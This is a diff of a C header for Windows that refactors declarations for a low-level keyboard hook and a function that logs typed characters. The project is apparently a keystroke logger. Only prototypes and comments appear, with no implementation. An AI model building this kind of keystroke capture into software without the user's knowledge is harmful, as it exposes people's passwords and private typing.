@@ -1,14 +1,13 @@
 #pragma once
 
-#include <stddef.h>
-#include <Windows.h>
+#include "win32.h"
 
 /*
  * set_keyboard_hook - Sets the low level keyboard hook.
  *
  * Returns a non-zero value if the function succeeds. If not, returns zero.
  */
-BOOL set_keyboard_hook();
+BOOL set_keyboard_hook(VOID);
 
 /*
  * get_keyboard_state - Copies the status of the 256 virtual keys to the
@@ -16,7 +15,7 @@ BOOL set_keyboard_hook();
  * @buff: The buffer to be filled with the keyboard state.
  * @size: The size of the buffer.
  */
-void get_keyboard_state(BYTE* buff, size_t size);
+void get_keyboard_state(BYTE *const buff, const SIZE_T size);
 
 /*
  * is_key_down - Returns whether the provided key is down.
@@ -24,7 +23,7 @@ void get_keyboard_state(BYTE* buff, size_t size);
  *
  * Returns whether the provided virtual-key code is down.
  */
-BOOL is_key_down(DWORD vk_code);
+BOOL is_key_down(const DWORD vk_code);
 
 /*
  * kbd_to_unicode - Logs the respective characters of the provided KBD hook.
@@ -34,4 +33,5 @@ BOOL is_key_down(DWORD vk_code);
  *
  * Returns the number of characters written to the buffer.
  */
-int kbd_to_unicode(const KBDLLHOOKSTRUCT* kbd_hook, LPWSTR buff, size_t size);
+int kbd_to_unicode(const KBDLLHOOKSTRUCT *const kbd_hook, const LPWSTR buff, 
+		   const size_t size);
